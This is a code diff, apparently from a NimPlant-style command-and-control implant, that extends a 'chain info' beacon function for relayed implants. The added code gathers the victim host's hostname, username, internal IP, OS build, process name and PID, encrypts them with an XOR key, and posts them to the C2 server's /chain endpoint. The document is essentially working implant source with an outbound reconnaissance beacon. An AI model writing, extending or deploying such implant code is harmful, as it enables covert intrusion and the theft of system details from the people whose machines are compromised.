@@ -3,7 +3,7 @@ import base64, json, puppy, sequtils
 from strutils import split, toLowerAscii, replace, strip, startsWith, toHex
 from os import parseCmdLine
 
-import ../util/[crypto, strenc]
+import ../util/[crypto, strenc, sysinfo]
 import ../config/configParser
 import tables, os, times, random
 
@@ -745,33 +745,73 @@ proc removeStoredImplantID() =
     except:
         discard
 
-# Add chain info reporting function
+# Enhanced chain info reporting function for distributed relay system
 proc postChainInfo*(listener: Listener, myGuid: string, parentGuid: string = "", myRole: string = "STANDARD", listeningPort: int = 0) =
     try:
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: === SENDING CHAIN INFO TO C2 ==="
+            echo "[DEBUG] 📡 HTTP: - Implant GUID: " & myGuid
+            echo "[DEBUG] 📡 HTTP: - Parent GUID: " & (if parentGuid == "": "NULL (Direct C2)" else: parentGuid)
+            echo "[DEBUG] 📡 HTTP: - Role: " & myRole
+            echo "[DEBUG] 📡 HTTP: - Listening Port: " & $listeningPort
+        
+        # Get system information for comprehensive chain data
+        let hostname = getSysHostname()
+        let username = getUsername()
+        let internalIP = getLocalIP()
+        let osInfo = getOSInfo()
+        let processName = getCurrentProcessName()
+        let pid = getCurrentPID()
+        
+        # Enhanced chain data with system information
         let chainData = %*{
             "type": "chain_info",
             "nimplant_guid": myGuid,
             "parent_guid": if parentGuid == "": newJNull() else: %parentGuid,
             "my_role": myRole,
             "listening_port": listeningPort,
-            "timestamp": epochTime().int64
+            "timestamp": epochTime().int64,
+            # Enhanced system information
+            "system_info": {
+                "hostname": hostname,
+                "username": username,
+                "internal_ip": internalIP,
+                "os_build": osInfo,
+                "process_name": processName,
+                "pid": pid
+            },
+            # Connection health information
+            "connection_health": {
+                "active": listener.registered,
+                "last_checkin": epochTime().int64,
+                "connection_type": if parentGuid == "": "DIRECT_C2" else: "RELAYED"
+            }
         }
         
         when defined debug:
-            echo "[DEBUG] 📡 HTTP: Sending chain info to C2: " & $chainData
+            echo "[DEBUG] 📡 HTTP: Enhanced chain data: " & $chainData
+            echo "[DEBUG] 📡 HTTP: - Encrypting with UNIQUE key..."
         
         # Encrypt chain data using the same pattern as other endpoints
         let encryptedData = encryptData($chainData, listener.UNIQUE_XOR_KEY)
         
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: - Encrypted data length: " & $encryptedData.len
+            echo "[DEBUG] 📡 HTTP: - Sending POST request to /chain endpoint..."
+        
         let response = doRequest(listener, "/chain", "data", encryptedData, "post")
         
         when defined debug:
+            echo "[DEBUG] 📡 HTTP: - Response code: " & $response.code
             if response.body != "":
-                echo "[DEBUG] 📡 HTTP: C2 response to chain info: " & response.body
+                echo "[DEBUG] 📡 HTTP: - C2 response: " & response.body
             else:
-                echo "[DEBUG] 📡 HTTP: Chain info sent successfully (code: " & $response.code & ")"
+                echo "[DEBUG] 📡 HTTP: - Chain info sent successfully"
+            echo "[DEBUG] 📡 HTTP: === END CHAIN INFO SEND ==="
                 
     except Exception as e:
         when defined debug:
-            echo "[DEBUG] 📡 HTTP: Error sending chain info: " & e.msg
+            echo "[DEBUG] 📡 HTTP: ❌ Error sending chain info: " & e.msg
+            echo "[DEBUG] 📡 HTTP: - Exception type: " & $type(e).name
+            echo "[DEBUG] 📡 HTTP: === END CHAIN INFO SEND (ERROR) ==="
 
